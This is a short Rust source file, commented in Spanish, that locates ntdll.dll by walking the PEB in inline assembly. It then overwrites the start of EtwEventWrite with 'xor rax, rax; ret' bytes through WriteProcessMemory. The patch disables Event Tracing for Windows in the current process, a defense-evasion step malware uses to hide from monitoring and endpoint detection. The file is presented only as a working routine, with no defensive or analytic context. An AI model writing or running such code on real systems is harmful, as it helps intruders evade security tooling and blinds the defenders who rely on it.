use std::arch::asm;
use std::ffi::CString;
use std::mem;

use std::mem::transmute;
use std::ptr::null_mut;
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
use winapi::um::memoryapi::WriteProcessMemory;
use winapi::ctypes::c_void;
use ntapi::ntpsapi::NtCurrentProcess;

#[inline(never)]
unsafe fn get_ntdll_asm() -> usize {
    let mut ntdll_base: usize = 0;
    asm!(
        r#"
        xor rax, rax
        mov rax, gs:[0x60]          // Dirección del PEB
        mov rax, [rax + 0x18]       // Campo Ldr del PEB
        mov rax, [rax + 0x20]       // Lista de módulos cargados
        mov rax, [rax]              // Siguiente módulo (saltando el primero)
        mov rax, [rax + 0x20]       // Dirección base de `ntdll.dll`
        "#,
        lateout("rax") ntdll_base, // `ntdll_base` contendrá la dirección base
        options(nostack)
    );
    ntdll_base
}

pub fn patch_process() {
    unsafe {
        let ntdll_base_asm = get_ntdll_asm();
        println!("La dirección base de ntdll.dll (ASM): 0x{:x}", ntdll_base_asm);


        let ntdll_module = mem::transmute::<usize, *mut std::os::raw::c_void>(ntdll_base_asm);
        let ntdll_module = ntdll_module as _;


        // Obtiene la dirección de `EtwEventWrite`
        let etw_event_write_name = CString::new("EtwEventWrite").unwrap();
        let mini = GetProcAddress(ntdll_module, etw_event_write_name.as_ptr());
        let hook = b"\x48\x33\xc0\xc3";
        WriteProcessMemory(NtCurrentProcess, mini as *mut c_void, hook.as_ptr() as _, hook.len(), null_mut());


    }
}
